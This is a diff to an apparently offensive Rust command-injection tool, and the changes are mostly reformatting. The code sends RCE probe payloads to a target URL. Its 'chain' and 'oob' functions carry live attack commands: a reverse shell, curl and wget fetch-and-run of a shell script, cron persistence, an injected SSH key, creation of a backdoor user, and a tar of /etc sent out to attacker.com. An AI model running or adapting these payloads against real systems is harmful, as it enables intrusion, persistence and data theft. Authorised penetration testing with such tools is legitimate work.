@@ -3,7 +3,11 @@ use reqwest::Client;
 use std::time::Duration;
 
 fn build_client(timeout: u64) -> Client {
-    Client::builder().timeout(Duration::from_secs(timeout)).redirect(reqwest::redirect::Policy::none()).build().unwrap_or_else(|_| Client::new())
+    Client::builder()
+        .timeout(Duration::from_secs(timeout))
+        .redirect(reqwest::redirect::Policy::none())
+        .build()
+        .unwrap_or_else(|_| Client::new())
 }
 
 pub async fn detect(url: &str, timeout: u64) -> anyhow::Result<()> {
@@ -19,8 +23,18 @@ pub async fn detect(url: &str, timeout: u64) -> anyhow::Result<()> {
         ("Linux uname", "uname -a", "Linux", "GNU"),
         ("Windows whoami", "whoami", "nt authority", "administrator"),
         ("Windows ver", "ver", "Microsoft", "Windows"),
-        ("Python exec", "__import__('os').system('id')", "uid=", "gid="),
-        ("Node exec", "require('child_process').execSync('id')", "uid=", "gid="),
+        (
+            "Python exec",
+            "__import__('os').system('id')",
+            "uid=",
+            "gid=",
+        ),
+        (
+            "Node exec",
+            "require('child_process').execSync('id')",
+            "uid=",
+            "gid=",
+        ),
         ("PHP exec", "system('id')", "uid=", "gid="),
     ];
 
@@ -33,15 +47,12 @@ pub async fn detect(url: &str, timeout: u64) -> anyhow::Result<()> {
             format!("{}q={}", url, cmd),
         ];
         for target in &params {
-            match client.get(target).send().await {
-                Ok(r) => {
-                    let text = r.text().await.unwrap_or_default();
-                    if text.contains(marker1) || text.contains(marker2) {
-                        println!("  {} {:20} — RCE DETECTED", "[!]".red().bold(), name);
-                        break;
-                    }
+            if let Ok(r) = client.get(target).send().await {
+                let text = r.text().await.unwrap_or_default();
+                if text.contains(marker1) || text.contains(marker2) {
+                    println!("  {} {:20} — RCE DETECTED", "[!]".red().bold(), name);
+                    break;
                 }
-                Err(_) => {}
             }
         }
     }
@@ -96,14 +107,32 @@ pub async fn chain(url: &str, timeout: u64) -> anyhow::Result<()> {
 
     let client = build_client(timeout);
     let chain_payloads = [
-        ("Reverse shell", "bash -i >& /dev/tcp/attacker.com/4444 0>&1"),
+        (
+            "Reverse shell",
+            "bash -i >& /dev/tcp/attacker.com/4444 0>&1",
+        ),
         ("File write", "echo 'hacked' > /tmp/pwned.txt"),
         ("Curl exec", "curl http://attacker.com/shell.sh | bash"),
-        ("Wget exec", "wget http://attacker.com/shell.sh -O /tmp/sh.sh && bash /tmp/sh.sh"),
-        ("Cron job", "(crontab -l; echo '* * * * * curl http://attacker.com/ping') | crontab -"),
-        ("SSH key", "echo 'ssh-rsa AAAA...' >> /root/.ssh/authorized_keys"),
-        ("User add", "useradd -m -s /bin/bash attacker && echo 'attacker:pass' | chpasswd"),
-        ("Data exfil", "tar czf - /etc | curl -X POST -d @- http://attacker.com/exfil"),
+        (
+            "Wget exec",
+            "wget http://attacker.com/shell.sh -O /tmp/sh.sh && bash /tmp/sh.sh",
+        ),
+        (
+            "Cron job",
+            "(crontab -l; echo '* * * * * curl http://attacker.com/ping') | crontab -",
+        ),
+        (
+            "SSH key",
+            "echo 'ssh-rsa AAAA...' >> /root/.ssh/authorized_keys",
+        ),
+        (
+            "User add",
+            "useradd -m -s /bin/bash attacker && echo 'attacker:pass' | chpasswd",
+        ),
+        (
+            "Data exfil",
+            "tar czf - /etc | curl -X POST -d @- http://attacker.com/exfil",
+        ),
     ];
 
     for (name, payload) in &chain_payloads {
@@ -137,9 +166,18 @@ pub async fn oob(url: &str, timeout: u64) -> anyhow::Result<()> {
         ("Wget OOB", "wget http://attacker.com/oob"),
         ("Ping OOB", "ping -c 1 attacker.com"),
         ("Dig OOB", "dig attacker.com"),
-        ("Python OOB", "python -c 'import urllib;urllib.urlopen(\"http://attacker.com/oob\")'"),
-        ("Perl OOB", "perl -e 'use LWP::Simple; get(\"http://attacker.com/oob\")'"),
-        ("PowerShell OOB", "powershell -c 'Invoke-WebRequest http://attacker.com/oob'"),
+        (
+            "Python OOB",
+            "python -c 'import urllib;urllib.urlopen(\"http://attacker.com/oob\")'",
+        ),
+        (
+            "Perl OOB",
+            "perl -e 'use LWP::Simple; get(\"http://attacker.com/oob\")'",
+        ),
+        (
+            "PowerShell OOB",
+            "powershell -c 'Invoke-WebRequest http://attacker.com/oob'",
+        ),
     ];
 
     for (name, payload) in &oob_payloads {
@@ -147,13 +185,21 @@ pub async fn oob(url: &str, timeout: u64) -> anyhow::Result<()> {
         match client.get(&target).send().await {
             Ok(r) => {
                 let status = r.status().as_u16();
-                println!("  {} {:20} — status={} (check callback server)", "*".cyan(), name, status);
+                println!(
+                    "  {} {:20} — status={} (check callback server)",
+                    "*".cyan(),
+                    name,
+                    status
+                );
             }
             Err(_) => println!("  {} {:20} — error", "[-]".dimmed(), name),
         }
     }
 
-    println!("\n  {} Monitor your callback server for incoming requests", "[*]".cyan().bold());
+    println!(
+        "\n  {} Monitor your callback server for incoming requests",
+        "[*]".cyan().bold()
+    );
 
     Ok(())
 }
